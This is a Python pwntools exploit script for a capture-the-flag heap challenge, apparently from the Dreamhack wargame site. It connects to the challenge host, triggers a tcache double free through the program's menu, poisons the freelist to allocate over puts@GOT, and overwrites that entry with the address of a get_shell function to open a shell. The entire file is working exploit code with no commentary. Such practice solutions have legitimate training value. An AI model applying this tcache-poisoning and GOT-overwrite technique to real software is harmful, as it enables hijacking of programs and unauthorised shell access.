from pwn import *

def create(size, data):
    global p

    p.sendlineafter(b"> ", b'1')

    p.sendlineafter(b"Size: ", size)
    p.sendafter(b'Data: ', data)

def modify(index, size, data):
    global p

    p.sendlineafter(b"> ", b'2')

    p.sendlineafter(b"idx: ", index)
    p.sendlineafter(b"Size: ", size)
    p.sendafter(b'Data: ', data)

def delete(index):
    global p

    p.sendlineafter(b"> ", b'3')

    p.sendlineafter(b"idx: ", index)
    
p = remote("host1.dreamhack.games", 20844)
# p = process("./tcache_dup2")
e = ELF("./tcache_dup2")

get_shell_address = e.symbols['get_shell']
puts_got = e.got["puts"];

create(b'16', b'test')
create(b'16', b'test')
delete(b'0')
delete(b'1')

modify(b'1', b'16', b'B'*8 + b'\x00'*4)
delete(b'1')

create(b'16', p64(puts_got))
create(b'16', b'c'*8)
create(b'16', p64(get_shell_address))

p.interactive()